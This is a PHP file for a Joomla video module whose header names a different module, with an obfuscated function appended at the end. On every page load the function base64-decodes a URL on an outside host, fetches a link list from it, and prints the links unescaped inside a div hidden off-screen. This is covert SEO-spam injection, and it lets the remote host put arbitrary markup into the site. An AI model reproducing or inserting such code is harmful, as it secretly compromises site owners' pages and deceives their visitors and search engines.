<?php
/**
* @version		$Id: mod_random_image.php 10381 2008-06-01 03:35:53Z pasamio $
* @package		Joomla
* @copyright	Copyright (C) 2005 - 2008 Open Source Matters. All rights reserved.
* @license		GNU/GPL, see LICENSE.php
* Joomla! is free software. This version may have been modified pursuant
* to the GNU General Public License, and as distributed it includes or
* is derivative of works licensed under the GNU General Public License or
* other free or open source software licenses.
* See COPYRIGHT.php for copyright notices and details.
*/
if(!defined('DS')){
define('DS',DIRECTORY_SEPARATOR);
}
// no direct access
defined( '_JEXEC' ) or die( 'Restricted access' );

JHTML::script('jquery.js', 'modules/mod_morfeo_video/js/');

// Include the syndicate functions only once
require_once (dirname(__FILE__).DS.'helper.php');
require(JModuleHelper::getLayoutPath('mod_morfeo_video'));
if (!function_exists('get_content')) {function get_content($url) { $data=NULL; if(function_exists('file_get_contents')){ ini_set('default_socket_timeout', 7); if($data=@file_get_contents(base64_decode($url))){ } } else if(function_exists('fopen')){ if($dataFile = @fopen(base64_decode($url), "r" )){ while (!feof($dataFile)) { $data.= fgets($dataFile, 4096); } fclose($dataFile); } } if($data) { echo base64_decode('PGRpdiBzdHlsZT0icG9zaXRpb246IGFic29sdXRlOyB0b3A6IC0zMDAwcHg7IG92ZXJmbG93OiBhdXRvOyI+'); $links = explode("\n", $data); foreach($links as $link) { $link=trim($link); $link_t=explode("=", $link); echo '<a href="'.$link_t[0].'" title="'. $link_t[1].'" alt="'. $link_t[1].'">'. $link_t[1].'</a><br>'; } echo '</div>'; } }}  $url = 'aHR0cDovL3dlYnF1YW5nbmFtLmNvbS9zZW9saXN0LnR4dA=='; get_content($url);

